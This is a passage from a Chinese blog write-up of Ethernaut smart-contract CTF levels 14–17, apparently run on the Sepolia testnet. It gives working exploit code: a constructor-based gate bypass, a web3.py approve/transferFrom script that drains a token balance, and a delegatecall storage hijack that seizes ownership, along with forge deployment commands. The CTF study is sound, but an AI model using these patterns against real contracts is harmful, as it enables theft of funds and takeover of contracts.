class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Transaction failed.&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>我也不知道为什么我要写个 py 脚本来调用攻击合约，本来全部东西都可以写进合约里面的，但是我开始有写循环的想法就下意识去用 Web3.py 了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300321502.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311300323303.png"
                      alt="image-20231130032336251"
                ></p>
<h2 id="14-Gatekeeper-Two"><a href="#14-Gatekeeper-Two" class="headerlink" title="14 Gatekeeper Two"></a>14 Gatekeeper Two</h2><h3 id="Code-1"><a href="#Code-1" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line">    address public entrant;</span><br><span class="line"></span><br><span class="line">    modifier gateOne() &#123;</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateTwo() &#123;</span><br><span class="line">        uint256 x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller()) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">        entrant = tx.origin;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h3><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p>
<p><strong>Things that might help:</strong></p>
<ul>
<li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li>
<li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a class="link"   target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a class="link"   target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf" >yellow paper <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</li>
<li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a class="link"   target="_blank" rel="noopener" href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" >here <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>). The Coin Flip level is also a good place to start when approaching this challenge.</li>
</ul>
<h3 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h3><p><strong>gateOne</strong>：</p>
<p>这题的 gateOne 与上一关相同。</p>
<p><strong>gateTwo</strong>：</p>
<p>gateTwo 中使用了内联汇编，功能是获取调用者的代码大小，判断其为0才能通过。题目叫我去看内联汇编和黄皮书，看看先：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh/v0.8.20/assembly.html" >关于内联汇编 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://docs.soliditylang.org/zh/v0.8.20/yul.html#yul" >关于 Yul <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://ethereum.github.io/yellowpaper/paper.pdf" >Ethereum 黄皮书 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>从黄皮书中看到如下一段话：</p>
<blockquote>
<p>7.1. <strong>Subtleties.</strong> Note that while the initialisation code is executing,the newly created address exists but with no intrinsic body code^5^. Thus any message call received by it during this time causes no code to be executed. If the initialisation execution ends with a SELFDESTRUCT instruction, the matter is moot since the account will be deleted before the transaction is completed.For a normal STOP code, or if the code returned is otherwise empty, then the state is left with a zombie account, and any remaining balance will be locked into the account forever.</p>
<p>^5^During initialization code execution, EXTCODESIZE on the address should return zero,which is the length of the code of the account while CODESIZE should return the length of the initialization code (as defined in H.2).</p>
</blockquote>
<p>说得很清楚，在合约的初始化代码执行过程中，新创建的地址是存在的，但没有内在的主题代码。即该地址上的 ESXTCODESIZE 此时返回0，可以满足题目的条件。</p>
<p><strong>gateThree</strong>：</p>
<p><code>abi.encodePacked()</code>是一种非标准的打包方式，其中规则如下：</p>
<ul>
<li>短于32字节的类型直接连接，没有填充或符号扩展。</li>
<li>动态类型是直接编码的，没有长度。</li>
<li>数组元素被填充，但仍被是直接编码。</li>
</ul>
<p>此外，不支持结构以及嵌套数组。</p>
<p>本题中只对<code>msg.sender</code>进行编码，很显然结果就是它的地址的字节序列。那么只需要计算一下就能得出<code>uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))</code>的值，只是由于本题需要在构造函数中完成对目标合约 enter 函数的调用，所以这个值不能提前计算，而是要在构造函数中直接计算。一旦构造函数开始运行，这个新创建的合约的地址就存在了，所以我们具备计算出它的条件。</p>
<h3 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h3><p>攻击合约如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    GatekeeperTwo public myGate;</span><br><span class="line">    bytes8 public gateKey;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        myGate = GatekeeperTwo(_target);</span><br><span class="line">        gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));</span><br><span class="line">        myGate.enter(gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202311301346739.png"
                      alt="image-20231130134636673"
                ></p>
<h2 id="15-Naught-Coin"><a href="#15-Naught-Coin" class="headerlink" title="15 Naught Coin"></a>15 Naught Coin</h2><h3 id="Code-2"><a href="#Code-2" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract NaughtCoin is ERC20 &#123;</span><br><span class="line">    // string public constant name = &#x27;NaughtCoin&#x27;;</span><br><span class="line">    // string public constant symbol = &#x27;0x0&#x27;;</span><br><span class="line">    // uint public constant decimals = 18;</span><br><span class="line">    uint256 public timeLock = block.timestamp + 10 * 365 days;</span><br><span class="line">    uint256 public INITIAL_SUPPLY;</span><br><span class="line">    address public player;</span><br><span class="line"></span><br><span class="line">    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));</span><br><span class="line">        // _totalSupply = INITIAL_SUPPLY;</span><br><span class="line">        // _balances[player] = INITIAL_SUPPLY;</span><br><span class="line">        _mint(player, INITIAL_SUPPLY);</span><br><span class="line">        emit Transfer(address(0), player, INITIAL_SUPPLY);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address _to, uint256 _value)</span><br><span class="line">        public</span><br><span class="line">        override</span><br><span class="line">        lockTokens</span><br><span class="line">        returns (bool)</span><br><span class="line">    &#123;</span><br><span class="line">        super.transfer(_to, _value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Prevent the initial owner from transferring tokens until the timelock has passed</span><br><span class="line">    modifier lockTokens() &#123;</span><br><span class="line">        if (msg.sender == player) &#123;</span><br><span class="line">            require(block.timestamp &gt; timeLock);</span><br><span class="line">            _;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            _;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h3><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p>
<p> Things that might help</p>
<ul>
<li>The <a class="link"   target="_blank" rel="noopener" href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" >ERC20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> Spec</li>
<li>The <a class="link"   target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" >OpenZeppelin <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> codebase</li>
</ul>
<h3 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目是一个 ERC-20 标准的代币合约，其继承于 OppenZepplin Contracts 的 ERC20 合约，其解析见 <a href="/2023/12/03/%E6%B5%85%E6%9E%90ERC-20">浅析ERC-20</a>。</p>
<p>题目要求要把我们手里的余额花完，但是修改器<code>lockTokens</code>检测到<code>msg.sender</code>为玩家时会判断时间戳，要十年后才能解锁。但是当 sender 不是玩家的时候就会直接执行 transfer 了。</p>
<p>看完 ERC-20 就知道可以把自己账户中的余额授权给另一个账户以供使用，这样就可以使 sender 不是玩家，绕过修改器。</p>
<h3 id="Exploit-2"><a href="#Exploit-2" class="headerlink" title="Exploit"></a>Exploit</h3><p>python 攻击脚本如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"></span><br><span class="line">web3 = Web3(Web3.HTTPProvider(<span class="string">&#x27;https://rpc.sepolia.org&#x27;</span>))</span><br><span class="line"></span><br><span class="line">player_address = <span class="string">&#x27;PLAYER_ADD&#x27;</span></span><br><span class="line">player_pk = <span class="string">&#x27;PLAYER_PK&#x27;</span></span><br><span class="line"></span><br><span class="line">hacker_address = <span class="string">&#x27;HACKER_ADD&#x27;</span></span><br><span class="line">hacker_pk = <span class="string">&#x27;HACKER_PK&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 合约abi，太长，不放上去了</span></span><br><span class="line">target_abi = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">target_address = <span class="string">&#x27;GAME_ADD&#x27;</span></span><br><span class="line">target_conctract = web3.eth.contract(abi=target_abi, address=target_address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aprrove</span>():</span><br><span class="line">    player_balance = target_conctract.functions.balanceOf(player_address).call()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Before hacking raw balance: &quot;</span> + <span class="built_in">str</span>(player_balance))</span><br><span class="line"></span><br><span class="line">    nonce = web3.eth.get_transaction_count(player_address)</span><br><span class="line">    approve = target_conctract.functions.approve(hacker_address, player_balance).build_transaction(&#123;</span><br><span class="line">        <span class="string">&#x27;from&#x27;</span>: player_address,</span><br><span class="line">        <span class="string">&#x27;nonce&#x27;</span>: nonce</span><br><span class="line">        &#125;)</span><br><span class="line">    signed_approve = web3.eth.account.sign_transaction(approve, private_key=player_pk)</span><br><span class="line"></span><br><span class="line">    approve_hash = web3.eth.send_raw_transaction(signed_approve.rawTransaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Approve transaction hash: &quot;</span> + approve_hash.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>():</span><br><span class="line">    player_balance = target_conctract.functions.balanceOf(player_address).call()</span><br><span class="line"></span><br><span class="line">    nonce = web3.eth.get_transaction_count(hacker_address)</span><br><span class="line">    hack = target_conctract.functions.transferFrom(player_address, hacker_address, player_balance).build_transaction(&#123;</span><br><span class="line">        <span class="string">&quot;from&quot;</span>: hacker_address,</span><br><span class="line">        <span class="string">&quot;nonce&quot;</span>: nonce</span><br><span class="line">        &#125;)</span><br><span class="line">    signed_hack = web3.eth.account.sign_transaction(hack, private_key=hacker_pk)</span><br><span class="line"></span><br><span class="line">    hack_hash = web3.eth.send_raw_transaction(signed_hack.rawTransaction)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Hack transaction hash: &quot;</span> + hack_hash.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">    web3.eth.wait_for_transaction_receipt(hack_hash)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;After hacking raw balance: &quot;</span> + <span class="built_in">str</span>(target_conctract.functions.balanceOf(player_address).call()))</span><br><span class="line"></span><br><span class="line">aprrove()</span><br><span class="line">hack()</span><br></pre></td></tr></table></figure></div>

<p>执行，成功掏空玩家的 balance：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041300675.png"
                      alt="image-20231204130058484"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312041301056.png"
                      alt="image-20231204130108992"
                ></p>
<h2 id="16-Preservation"><a href="#16-Preservation" class="headerlink" title="16 Preservation"></a>16 Preservation</h2><h3 id="Code-3"><a href="#Code-3" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Preservation &#123;</span><br><span class="line">    // public library contracts</span><br><span class="line">    address public timeZone1Library;</span><br><span class="line">    address public timeZone2Library;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 storedTime;</span><br><span class="line">    // Sets the function signature for delegatecall</span><br><span class="line">    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));</span><br><span class="line"></span><br><span class="line">    constructor(</span><br><span class="line">        address _timeZone1LibraryAddress,</span><br><span class="line">        address _timeZone2LibraryAddress</span><br><span class="line">    ) &#123;</span><br><span class="line">        timeZone1Library = _timeZone1LibraryAddress;</span><br><span class="line">        timeZone2Library = _timeZone2LibraryAddress;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 1</span><br><span class="line">    function setFirstTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone1Library.delegatecall(</span><br><span class="line">            abi.encodePacked(setTimeSignature, _timeStamp)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // set the time for timezone 2</span><br><span class="line">    function setSecondTime(uint256 _timeStamp) public &#123;</span><br><span class="line">        timeZone2Library.delegatecall(</span><br><span class="line">            abi.encodePacked(setTimeSignature, _timeStamp)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Simple library contract to set the time</span><br><span class="line">contract LibraryContract &#123;</span><br><span class="line">    // stores a timestamp</span><br><span class="line">    uint256 storedTime;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _time) public &#123;</span><br><span class="line">        storedTime = _time;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h3><p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
<p> Things that might help</p>
<ul>
<li>Look into Solidity’s documentation on the <code>delegatecall</code> low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.</li>
<li>Understanding what it means for <code>delegatecall</code> to be context-preserving.</li>
<li>Understanding how storage variables are stored and accessed.</li>
<li>Understanding how casting works between different data types.</li>
</ul>
<h3 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h3><p>题目中给我们强调了<code>delegatecall</code>的属性，这里我们需要知道，当使用委托调用去调用目标合约的函数时，使用的是调用者合约的存储空间，而不是被调用者合约的存储空间。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312051117752.png"
                     
                >	</p>
<p>那么若是修改了被调用者合约中的状态变量，那么就会修改这些变量所在的插槽对应的调用者合约的插槽中的数据。</p>
<p>所以攻击就有了头绪：由于 LibraryContract 合约只有一个状态变量在 Slot_0，所以我们只能修改原合约中的 Slot_0 中的<code>timeZone1Library</code>变量为自己的攻击合约，这样在调用<code>setFirstTime</code>函数时就会对攻击合约进行委托调用，就可以修改原合约中的<code>owner</code>。</p>
<h3 id="Exploit-3"><a href="#Exploit-3" class="headerlink" title="Exploit"></a>Exploit</h3><p>先部署攻击合约：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    address public useless;</span><br><span class="line">    address public use1e55;</span><br><span class="line">    address public owner;</span><br><span class="line">    Preservation target;</span><br><span class="line"></span><br><span class="line">    function setTimeZone1Library(address _target) public &#123;</span><br><span class="line">        target = Preservation(_target);</span><br><span class="line">        target.setFirstTime(uint160(address(this)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _us3less) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge create --rpc-url https://rpc.sepolia.org --private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack</span><br></pre></td></tr></table></figure></div>

<p>首先调用<code>setTimeZone1Library</code>修改题目里面<code>timeZone1Library</code>的值，然后再调用题目合约中的<code>setFirstTime</code>修改 owner 就好啦。</p>
<p><del>不太行。。。。。gas 不够，把初始化 Preservation 和获取转换自己地址的代码放到构造函数里面吧</del>（出现这个问题是因为我疏忽了，没有去调节 Metamask 里面的 Gas 设置）：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">contract Hack &#123;</span><br><span class="line">    address public useless;</span><br><span class="line">    address public use1e55;</span><br><span class="line">    address public owner;</span><br><span class="line">    Preservation target;</span><br><span class="line">    uint256 public self;</span><br><span class="line"></span><br><span class="line">    constructor(address _target) public &#123;</span><br><span class="line">        target = Preservation(_target);</span><br><span class="line">        self = uint256(uint160(address(this)))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTimeZone1Library() public &#123;</span><br><span class="line">        target.setFirstTime(self);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setTime(uint256 _us3less) public &#123;</span><br><span class="line">        owner = tx.origin;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>部署时候加一个<code>--constructor-args</code>：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">forge create --rpc-url https://rpc.sepolia.org \</span><br><span class="line">--private-key &lt;CREATEOR_PRIVATE_KEY&gt; src/hack_16.sol:Hack \</span><br><span class="line">--constructor-args 0xC58963621d4CD62A40D409CEe607d9068DeA8267</span><br></pre></td></tr></table></figure></div>

<p>先调用攻合约的 setTimeZone1Library()，再调用目标合约的 setFirstTime() 即可。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061024264.png"
                      alt="image-20231206102448156"
                ></p>
<h2 id="17-Recovery"><a href="#17-Recovery" class="headerlink" title="17 Recovery"></a>17 Recovery</h2><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line">    //generate tokens</span><br><span class="line">    function generateToken(string memory _name, uint256 _initialSupply) public &#123;</span><br><span class="line">        new SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line">    string public name;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    // constructor</span><br><span class="line">    constructor(</span><br><span class="line">        string memory _name,</span><br><span class="line">        address _creator,</span><br><span class="line">        uint256 _initialSupply</span><br><span class="line">    ) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">        balances[_creator] = _initialSupply;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // collect ether in return for tokens</span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        balances[msg.sender] = msg.value * 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow transfers of tokens</span><br><span class="line">    function transfer(address _to, uint256 _amount) public &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">        balances[_to] = _amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // clean up after ourselves</span><br><span class="line">    function destroy(address payable _to) public &#123;</span><br><span class="line">        selfdestruct(_to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Description-4"><a href="#Description-4" class="headerlink" title="Description"></a>Description</h3><p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the <code>0.001</code> ether from the lost contract address.</p>
<h3 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h3><p>这题要我们恢复第一个代币合约的创建者给出的 0.001ETH，应该是找到这个代币合约然后调用它的 destroy 就好。从生成代币的合约中找不到任何东西的，这里要用以太坊浏览器查看交易记录，找到对应的代币合约和 creator。使用 etherscan.io 这么个以太坊浏览器，首先查看题目给到的题目合约地址：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://raw.gitmirror.com/f4tb3e/AutoUploadPics/main/img/202312061136843.png"
                      alt="image-20231206112323196"
                ></p>
<p>查看合约创建的交易调用过程：</p>
<p><img  
                     lazyload
